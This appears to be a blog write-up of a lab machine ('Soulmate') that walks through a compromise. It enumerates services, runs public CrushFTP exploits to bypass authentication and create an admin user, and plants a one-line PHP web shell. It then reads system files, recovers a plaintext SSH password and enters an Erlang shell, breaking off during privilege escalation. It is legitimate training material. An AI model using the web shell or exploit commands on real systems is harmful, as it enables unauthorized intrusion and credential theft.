---
layout: post
title: "Relationship"
date: 2025-09-12
---

## Challenge Description
This was another Machine to pwn, this one was not so intuitive like others we encountered.

## Solution

As always lets start by retriving the needed informations:

`nmap 10.10.11.86`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 16:47 CEST
Nmap scan report for 10.10.11.86
Host is up (0.071s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

`python dirsearch.py -u 10.10.11.86`

```
Target: http://10.10.11.86/

[16:47:41] Scanning:                                                                                                              
[16:47:45] 302 -   154B - /a  ->  http://soulmate.htb/                      
[16:47:50] 302 -   154B - /b  ->  http://soulmate.htb/                      
[16:47:53] 302 -   154B - /e  ->  http://soulmate.htb/                      
[16:47:54] 302 -   154B - /h  ->  http://soulmate.htb/                      
[16:47:55] 302 -   154B - /l  ->  http://soulmate.htb/                      
[16:47:56] 302 -   154B - /m  ->  http://soulmate.htb/                      
[16:47:57] 302 -   154B - /o  ->  http://soulmate.htb/                      
[16:47:58] 302 -   154B - /p  ->  http://soulmate.htb/                      
[16:48:00] 302 -   154B - /s  ->  http://soulmate.htb/                      
[16:48:02] 302 -   154B - /t  ->  http://soulmate.htb/                      
                                                                             
Task Completed                                      
```

Lets resolve the IP since we are not able to reach the url.

`sudo nano /etc/hosts`

Add this line:

`10.10.11.86   soulmate.htb`

If we run again dirsearch we have a different output:

```
Target: http://soulmate.htb/

[16:50:16] Scanning:                                                                                                               
[16:50:25] 301 -   178B - /assets  ->  http://soulmate.htb/assets/          
[16:50:25] 403 -   564B - /assets/                                          
[16:50:27] 302 -     0B - /dashboard.php  ->  /login                        
[16:50:30] 200 -   16KB - /index.php                                        
[16:50:31] 200 -    8KB - /login.php                                        
[16:50:31] 302 -     0B - /logout.php  ->  login.php                        
[16:50:34] 302 -     0B - /profile.php  ->  /login                          
[16:50:35] 200 -   11KB - /register.php                                     
                                                                             
Task Completed
```

I tried to run sqlmap on the forms but nothing seems to be injectable, lets take a look a little bit better at the url:

`gobuster vhost -u http://soulmate.htb -w /path/to/SecLists-master/Discovery/DNS/combined_subdomains.txt --append-domain -t 50`

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://soulmate.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /path/to/SecLists-master/Discovery/DNS/combined_subdomains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: ftp.soulmate.htb Status: 302 [Size: 0] [--> /WebInterface/login.html]
```

We found something interesting! Lets add `ftp.soulmate.htb` to `/etc/hosts` in order to resolve it.

Lets look online for this service `CrushFTP`. I found a CVE related to it and especially to that version.

With this POC: 
`https://github.com/watchtowrlabs/watchTowr-vs-CrushFTP-Authentication-Bypass-CVE-2025-54309/tree/main`

That uses the function `getUserList` to retrive this:

`python watchTowr-vs-CrushFTP-CVE-2025-54309.py http://ftp.soulmate.htb`

```
/path/to/Soulmate/watchTowr-vs-CrushFTP-CVE-2025-54309.py:59: SyntaxWarning: invalid escape sequence '\c'
  "AS2-TO": "\crushadmin",
[*] Generated new c2f value: w1dM
                         __         ___  ___________                   
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________ 
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|   
                                  \/          \/     \/                            
          
        watchTowr-vs-CrushFTP-CVE-2025-54309.py
        (*) CrushFTP Authentication Bypass Race Condition PoC
        
          - Sonny , watchTowr (sonny@watchTowr.com)

        CVEs: [CVE-2025-54309]
        
[*] CRUSHFTP RACE CONDITION POC
[*] TARGET: http://ftp.soulmate.htb
[*] ENDPOINT: CrushFTP WebInterface getUserList
[*] ATTACK: 5000 requests with new c2f every 50 requests
============================================================
Starting race with 5000 request pairs...
============================================================
[*] Generated new c2f value: XqvA
[*] NEW SESSION: c2f=XqvA
[*] RESPONSE <?xml version="1.0" encoding="UTF-8"?> 
<result><response_status>OK</response_status><response_type>properties</response_type><response_data><user_list type="properties">
        <user_list type="vector">
                <user_list_subitem>AuthBypassAccount</user_list_subitem>
                <user_list_subitem>ben</user_list_subitem>
                <user_list_subitem>crushadmin</user_list_subitem>
                <user_list_subitem>default</user_list_subitem>
                <user_list_subitem>jenna</user_list_subitem>
                <user_list_subitem>TempAccount</user_list_subitem>
        </user_list>
</user_list></response_data></result>

[*] EXFILTRATED 6 USERS: AuthBypassAccount, ben, crushadmin, default, jenna, TempAccount
[*] VULNERABLE! RACE CONDITION POSSIBLE!
```

Nice now we know what users have access to this platform. Now that we know we can levarage this vulnerability lets continue on this path.

Another POC allows us to use another function that allows us to create a new user with admin privileges:

`https://github.com/Immersive-Labs-Sec/CVE-2025-31161/blob/main/cve-2025-31161.py`


`python3 poc.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user mytest --password test`

```
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: mytest
   [*] Password: test.
```

I added this new user and I was able to login in the CrushFTP service. Once logged in I can change the password of other users, or move the files into my folder to download and visualize them. 

For example this is `/etch/shadow`:

```
root:*::0::::: bin:!::0::::: daemon:!::0::::: adm:!::0::::: lp:!::0::::: sync:!::0::::: shutdown:!::0::::: halt:!::0::::: mail:!::0::::: news:!::0::::: uucp:!::0::::: operator:!::0::::: man:!::0::::: postmaster:!::0::::: cron:!::0::::: ftp:!::0::::: sshd:!::0::::: xfs:!::0::::: nobody:!::0:::::
```

This one is `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/ash 
bin:x:1:1:bin:/bin:/sbin/nologin 
daemon:x:2:2:daemon:/sbin:/sbin/nologin 
adm:x:3:4:adm:/var/adm:/sbin/nologin 
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 
sync:x:5:0:sync:/sbin:/bin/sync 
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 
halt:x:7:0:halt:/sbin:/sbin/halt 
mail:x:8:12:mail:/var/mail:/sbin/nologin 
news:x:9:13:news:/usr/lib/news:/sbin/nologin 
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin 
operator:x:11:0:operator:/root:/sbin/nologin 
man:x:13:15:man:/usr/man:/sbin/nologin 
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin 
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin 
ftp:x:21:21::/var/lib/ftp:/sbin/nologin 
sshd:x:22:22:sshd:/dev/null:/sbin/nologin 
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin 
nobody:x:65534:65534:nobody:/:/sbin/nologin 
java:x:65532:65532
```

We need to find a way to enstablish an ssh connection.

After some looking around I found out that if we place files inside ben's `webProc` folder we are able to access them through the url. So I crafted a `shell.php` file and I uploaded it in ben's `webProc` folder:

`<?php if(isset($_REQUEST["cmd"])) system($_REQUEST["cmd"]); ?>`

After uploading the shell I tried to access it through the url:

`http://soulmate.htb/shell.php?cmd=id`

`uid=33(www-data) gid=33(www-data) groups=33(www-data) `

We are able to run the shell and execute commands.

`http://soulmate.htb/shell.php?cmd=ls -la ../../../../var/log/`

```
total 1036 drwxrwxr-x 12 root syslog 4096 Sep 12 11:05 . 
drwxr-xr-x 13 root root 4096 Sep 2 10:19 .. 
-rw-r--r-- 1 root root 208 Sep 12 11:05 alternatives.log 
-rw-r--r-- 1 root root 208 Sep 2 10:39 alternatives.log.1 
drwxr-xr-x 2 root root 4096 Sep 12 11:05 apt 
drwxr-x--- 2 root adm 4096 Sep 12 11:33 audit 
-rw-r----- 1 syslog adm 9889 Sep 12 11:31 auth.log 
-rw-r----- 1 syslog adm 1693 Sep 12 11:05 auth.log.1 
-rw-rw---- 1 root utmp 3072 Sep 12 11:31 btmp 
drwxr-xr-x 2 root root 4096 Feb 10 2023 dist-upgrade 
-rw-r----- 1 root adm 103549 Sep 12 11:05 dmesg 
-rw-r----- 1 root adm 102303 Sep 2 10:39 dmesg.0 
-rw-r--r-- 1 root root 0 Sep 12 11:05 dpkg.log 
-rw-r--r-- 1 root root 1545 Sep 2 10:19 dpkg.log.1 
drwxr-xr-x 2 root root 4096 Aug 27 09:28 erlang_login 
drwxr-x--- 4 root adm 4096 Apr 27 2023 installer 
drwxr-sr-x+ 3 root systemd-journal 4096 Apr 27 2023 journal 
-rw-r----- 1 syslog adm 20516 Sep 12 11:32 kern.log 
-rw-r----- 1 syslog adm 258179 Sep 12 11:05 kern.log.1 
drwxr-xr-x 2 landscape landscape 4096 Sep 2 10:39 landscape 
-rw-rw-r-- 1 root utmp 292292 Sep 12 11:19 lastlog 
drwxr-xr-x 2 _laurel _laurel 4096 Sep 12 11:32 laurel 
drwxr-xr-x 2 root adm 4096 Sep 2 10:39 nginx 
-rw------- 1 root root 185 Sep 12 11:05 php8.1-fpm.log 
-rw------- 1 root root 282 Sep 2 10:42 php8.1-fpm.log.1 
drwx------ 2 root root 4096 Feb 17 2023 private 
-rw-r----- 1 syslog adm 63766 Sep 12 11:33 syslog 
-rw-r----- 1 syslog adm 363507 Sep 12 11:05 syslog.1 
-rw-r--r-- 1 root root 193 Sep 2 10:39 vmware-network.1.log 
-rw-r--r-- 1 root root 195 Sep 12 11:05 vmware-network.log 
-rw------- 1 root root 3320 Sep 2 10:42 vmware-vmsvc-root.1.log 
-rw------- 1 root root 6547 Sep 12 11:05 vmware-vmsvc-root.log 
-rw------- 1 root root 1152 Sep 12 11:05 vmware-vmtoolsd-root.log 
-rw-rw-r-- 1 root utmp 4992 Sep 12 11:19 wtmp 
```

By using the shell I was able to see files and folders that previously I was not able from `CrushFTP` webinterface. By looking around I found these two files:

`http://soulmate.htb/shell.php?cmd=cat%20../../../../usr/local/lib/erlang_login/login.escript`

```
#!/usr/bin/env escript %%! -noshell main(_) -> %% Start required OTP apps safely start_app(crypto), start_app(asn1), start_app(public_key), start_app(ssh), %% Fetch environment vars safely User = safe_env("USER"), Conn = safe_env("SSH_CONNECTION"), Tty = safe_env("SSH_TTY"), Host = safe_env("HOSTNAME"), %% Build log line LogLine = io_lib:format("login user=~s from=~s tty=~s host=~s~n", [User, Conn, Tty, Host]), %% Log to syslog os:cmd("logger -t erlang_login " ++ lists:flatten(LogLine)), %% Log to a flat file ensure_logdir(), file:write_file("/var/log/erlang_login/session.log", LogLine, [append]), %% Exit cleanly halt(0). %% Utility to start app if not already running start_app(App) -> Apps = application:which_applications(), case lists:keyfind(App, 1, Apps) of false -> case application:start(App) of ok -> ok; {error, {already_started, _}} -> ok; {error, Reason} -> io:format("Warning: cannot start ~p: ~p~n", [App, Reason]) end; _ -> ok end. safe_env(Var) -> case os:getenv(Var) of false -> "unknown"; Val when is_list(Val) -> Val; Val when is_binary(Val) -> binary_to_list(Val) end. ensure_logdir() -> case file:read_file_info("/var/log/erlang_login") of {ok,_} -> ok; _ -> file:make_dir("/var/log/erlang_login") end, ok. 
```

Where this one was leaking the username and password of the user ben:

`http://soulmate.htb/shell.php?cmd=cat%20../../../../usr/local/lib/erlang_login/start.escript`

```
#!/usr/bin/env escript %%! -sname ssh_runner main(_) -> application:start(asn1), application:start(crypto), application:start(public_key), application:start(ssh), io:format("Starting SSH daemon with logging...~n"), case ssh:daemon(2222, [ {ip, {127,0,0,1}}, {system_dir, "/etc/ssh"}, {user_dir_fun, fun(User) -> Dir = filename:join("/home", User), io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]), filename:join(Dir, ".ssh") end}, {connectfun, fun(User, PeerAddr, Method) -> io:format("Auth success for user: ~p from ~p via ~p~n", [User, PeerAddr, Method]), true end}, {failfun, fun(User, PeerAddr, Reason) -> io:format("Auth failed for user: ~p from ~p, reason: ~p~n", [User, PeerAddr, Reason]), true end}, {auth_methods, "publickey,password"}, {user_passwords, [{"ben", "HouseH0ldings998"}]}, {idle_time, infinity}, {max_channels, 10}, {max_sessions, 10}, {parallel_login, true} ]) of {ok, _Pid} -> io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n"); {error, Reason} -> io:format("Failed to start SSH daemon: ~p~n", [Reason]) end, receive stop -> ok end. 
```

`{user_passwords, [{"ben", "HouseH0ldings998"}]}`

With these credentials I am able to connect via `SSH` and retrive the user flag:

```
ben@soulmate:~$ cat user.txt 
e9277cbc9f4aad35721ac227f86d63fe
```

Now lets move to get root privilege. First of all lets look for some informations.

`find / -perm -4000 -type f 2>/dev/null`

```
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3 
/usr/bin/sudo 
/usr/bin/passwd   
/usr/bin/mount   
/usr/bin/chfn   
/usr/lib/dbus-1.0/dbus-daemon-launch-helper 
/usr/lib/openssh/ssh-keysign 
/usr/libexec/polkit-agent-helper-1
```

I initally tried looking for `dbus` related informations, but it wasnt the right call. So I moved back to check what other services might be running:

`ben@soulmate:~$ ss -tuln`

```
Netid       State        Recv-Q       Send-Q              Local Address:Port                Peer Address:Port       Process       
udp         UNCONN       0            0                   127.0.0.53%lo:53                       0.0.0.0:*                        
tcp         LISTEN       0            4096                    127.0.0.1:35163                    0.0.0.0:*                        
tcp         LISTEN       0            4096                127.0.0.53%lo:53                       0.0.0.0:*                        
tcp         LISTEN       0            128                     127.0.0.1:45089                    0.0.0.0:*                        
tcp         LISTEN       0            5                       127.0.0.1:2222                     0.0.0.0:*                        
tcp         LISTEN       0            4096                    127.0.0.1:8443                     0.0.0.0:*                        
tcp         LISTEN       0            4096                    127.0.0.1:9090                     0.0.0.0:*                        
tcp         LISTEN       0            4096                      0.0.0.0:4369                     0.0.0.0:*                        
tcp         LISTEN       0            4096                    127.0.0.1:8080                     0.0.0.0:*                        
tcp         LISTEN       0            128                       0.0.0.0:22                       0.0.0.0:*                        
tcp         LISTEN       0            511                       0.0.0.0:80                       0.0.0.0:*                        
tcp         LISTEN       0            4096                         [::]:4369                        [::]:*                        
tcp         LISTEN       0            128                          [::]:22                          [::]:*                        
tcp         LISTEN       0            511                          [::]:80                          [::]:*                        
```

We can see that there is a service on `127.0.0.1:2222`. So I opened one terminal on listening:

```
nc 127.0.0.1 2222

SSH-2.0-Erlang/5.2.9
```

Its an Erlang shell. Lets try to connect to it, by opening another terminal and run: 

`ssh -p 2222 ben@127.0.0.1`

We are IN!

`(ssh_runner@soulmate)1>`

Now lets take a look at the commands we can execute:

`(ssh_runner@soulmate)1> help().`

```
** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
f(X)       -- forget the binding of variable X
h()        -- history
h(Mod)     -- help about module
h(Mod,Func)-- help about function in module
h(Mod,Func,Arity) -- help about function with arity in module
ht(Mod)    -- help about a module's types
ht(Mod,Type) -- help about type in module
ht(Mod,Type,Arity) -- help about type with arity in module
hcb(Mod)    -- help about a module's callbacks
hcb(Mod,CB) -- help about callback in module
hcb(Mod,CB,Arity) -- help about callback with arity in module
history(N) -- set how many previous commands to keep
results(N) -- set how many previous command results to keep
catch_exception(B) -- how exceptions are handled
v(N)       -- use the value of query <N>
rd(R,D)    -- define a record
rf()       -- remove all record information
rf(R)      -- remove record information about R
rl()       -- display all record information
rl(R)      -- display record information about R
rp(Term)   -- display Term using the shell's record information
rr(File)   -- read record information from File (wildcards allowed)
rr(F,R)    -- read selected record information from file(s)
rr(F,R,O)  -- read selected record information with options
lf()       -- list locally defined functions
lt()       -- list locally defined types
lr()       -- list locally defined records
ff()       -- forget all locally defined functions
ff({F,A})  -- forget locally defined function named as atom F and arity A
tf()       -- forget all locally defined types
tf(T)      -- forget locally defined type named as atom T
fl()       -- forget all locally defined functions, types and records
save_module(FilePath) -- save all locally defined functions, types and records to a file
bt(Pid)    -- stack backtrace for a process
c(Mod)     -- compile and load module or file <Mod>
cd(Dir)    -- change working directory
flush()    -- flush any messages sent to the shell
help()     -- help info
h(M)       -- module documentation
h(M,F)     -- module function documentation
h(M,F,A)   -- module function arity documentation
i()        -- information about the system
ni()       -- information about the networked system
i(X,Y,Z)   -- information about pid <X,Y,Z>
l(Module)  -- load or reload module
lm()       -- load all modified modules
lc([File]) -- compile a list of Erlang modules
ls()       -- list files in the current directory
ls(Dir)    -- list files in directory <Dir>
m()        -- which modules are loaded
m(Mod)     -- information about module <Mod>
mm()       -- list all modified modules
memory()   -- memory allocation information
memory(T)  -- memory allocation information of type <T>
nc(File)   -- compile and load code in <File> on all nodes
nl(Module) -- load module on all nodes
pid(X,Y,Z) -- convert X,Y,Z to a Pid
pwd()      -- print working directory
q()        -- quit - shorthand for init:stop()
regs()     -- information about registered processes
nregs()    -- information about all registered processes
uptime()   -- print node uptime
xm(M)      -- cross reference check a module
y(File)    -- generate a Yecc parser
** commands in module i (interpreter interface) **
ih()       -- print help for the i module
true
```

Lets look for the loaded modules with `m()`:

`(ssh_runner@soulmate)2> m().`

```
Module                File
application           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application.beam
application_controll  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_controller.beam
application_master    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_master.beam
atomics               preloaded
auth                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/auth.beam
base64                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/base64.beam
beam_a                /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_a.beam
beam_asm              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_asm.beam
beam_block            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_block.beam
beam_call_types       /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_call_types.beam
beam_clean            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_clean.beam
beam_core_to_ssa      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_core_to_ssa.beam
beam_dict             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_dict.beam
beam_digraph          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_digraph.beam
beam_doc              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_doc.beam
beam_flatten          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_flatten.beam
beam_jump             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_jump.beam
beam_lib              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/beam_lib.beam
beam_opcodes          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_opcodes.beam
beam_ssa              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa.beam
beam_ssa_alias        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_alias.beam
beam_ssa_bc_size      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bc_size.beam
beam_ssa_bool         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bool.beam
beam_ssa_bsm          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bsm.beam
beam_ssa_codegen      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_codegen.beam
beam_ssa_dead         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_dead.beam
beam_ssa_destructive  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_destructive_update.beam
beam_ssa_opt          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_opt.beam
beam_ssa_pre_codegen  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_pre_codegen.beam
beam_ssa_recv         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_recv.beam
beam_ssa_share        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_share.beam
beam_ssa_ss           /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_ss.beam
beam_ssa_throw        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_throw.beam
beam_ssa_type         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_type.beam
beam_trim             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_trim.beam
beam_types            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_types.beam
beam_utils            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_utils.beam
beam_validator        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_validator.beam
beam_z                /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_z.beam
binary                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/binary.beam
c                     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/c.beam
cerl                  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl.beam
cerl_clauses          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl_clauses.beam
cerl_trees            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl_trees.beam
code                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/code.beam
code_server           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/code_server.beam
compile               /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/compile.beam
core_lib              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/core_lib.beam
counters              preloaded
crypto                /usr/local/lib/erlang/lib/crypto-5.5.3/ebin/crypto.beam
digraph               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/digraph.beam
digraph_utils         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/digraph_utils.beam
edlin                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin.beam
edlin_context         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin_context.beam
edlin_expand          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin_expand.beam
edlin_key             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin_key.beam
epp                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/epp.beam
erl_abstract_code     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_abstract_code.beam
erl_anno              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_anno.beam
erl_bifs              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/erl_bifs.beam
erl_distribution      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_distribution.beam
erl_epmd              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_epmd.beam
erl_error             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_error.beam
erl_erts_errors       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_erts_errors.beam
erl_eval              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_eval.beam
erl_expand_records    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_expand_records.beam
erl_features          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_features.beam
erl_init              preloaded
erl_internal          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_internal.beam
erl_lint              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_lint.beam
erl_parse             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_parse.beam
erl_prim_loader       preloaded
erl_scan              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_scan.beam
erl_signal_handler    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_signal_handler.beam
erl_tracer            preloaded
erlang                preloaded
erpc                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erpc.beam
error_handler         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/error_handler.beam
error_logger          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/error_logger.beam
erts_code_purger      preloaded
erts_dirty_process_s  preloaded
erts_internal         preloaded
erts_literal_area_co  preloaded
erts_trace_cleaner    preloaded
escript               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/escript.beam
ets                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ets.beam
file                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file.beam
file_io_server        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file_io_server.beam
file_server           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file_server.beam
filename              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/filename.beam
gb_sets               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gb_sets.beam
gb_trees              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gb_trees.beam
gen                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen.beam
gen_event             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_event.beam
gen_server            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_server.beam
gen_statem            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_statem.beam
gen_tcp               /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/gen_tcp.beam
global                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/global.beam
global_group          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/global_group.beam
group                 /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/group.beam
group_history         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/group_history.beam
heart                 /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/heart.beam
inet                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet.beam
inet_config           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_config.beam
inet_db               /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_db.beam
inet_gethost_native   /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_gethost_native.beam
inet_parse            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_parse.beam
inet_tcp              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_tcp.beam
inet_tcp_dist         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_tcp_dist.beam
inet_udp              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_udp.beam
init                  preloaded
io                    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io.beam
io_lib                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib.beam
io_lib_format         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib_format.beam
io_lib_pretty         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib_pretty.beam
kernel                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel.beam
kernel_config         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel_config.beam
kernel_refc           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel_refc.beam
lists                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/lists.beam
logger                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger.beam
logger_backend        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_backend.beam
logger_config         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_config.beam
logger_filters        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_filters.beam
logger_formatter      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_formatter.beam
logger_h_common       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_h_common.beam
logger_handler_watch  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_handler_watcher.beam
logger_olp            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_olp.beam
logger_proxy          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_proxy.beam
logger_server         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_server.beam
logger_simple_h       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_simple_h.beam
logger_std_h          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_std_h.beam
logger_sup            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_sup.beam
maps                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/maps.beam
net_kernel            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/net_kernel.beam
orddict               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/orddict.beam
ordsets               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ordsets.beam
os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
otp_internal          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/otp_internal.beam
peer                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/peer.beam
persistent_term       preloaded
prim_buffer           preloaded
prim_eval             preloaded
prim_file             preloaded
prim_inet             preloaded
prim_net              preloaded
prim_socket           preloaded
prim_tty              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/prim_tty.beam
prim_zip              preloaded
proc_lib              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/proc_lib.beam
proplists             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/proplists.beam
pubkey_cert_records   /usr/local/lib/erlang/lib/public_key-1.17.1/ebin/pubkey_cert_records.beam
public_key            /usr/local/lib/erlang/lib/public_key-1.17.1/ebin/public_key.beam
queue                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/queue.beam
rand                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/rand.beam
